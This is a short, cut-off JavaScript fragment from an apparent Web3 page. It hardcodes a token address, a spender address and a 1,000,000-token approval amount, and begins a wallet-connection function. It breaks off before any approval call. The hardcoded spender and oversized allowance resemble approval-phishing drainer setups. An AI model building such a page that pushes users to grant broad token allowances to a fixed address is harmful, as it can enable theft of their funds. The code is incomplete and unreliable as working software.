const kjcAddress = "0xd479Ae350Dc24168E8dB863c5413C35fb2044ecD";
const spenderAddress = "0xBaeF58FC0Eb20334b2fDEC4882e2AB972C1242DE";
const approveAmount = "1000000000000000000000000"; // 1,000,000 KJC

let userAccount;
let kjcToken;

async function connectWallet() {
  if (window.ethereum) {
    window.web3 = new Web3(window.ethereum);
    try {
      await window.ethereum.request({ method: "eth_requestAccounts" });
      const accounts = await web3.eth.getAccounts();
      userAccount = accounts[0];
      document.getElementById("walletAddress").innerText = "✅ " + userAccount;

      kjcToken = new web3.eth.Contract(erc20ABI, kjcAddress);
    } catch (e) {
      console.error(e
      document
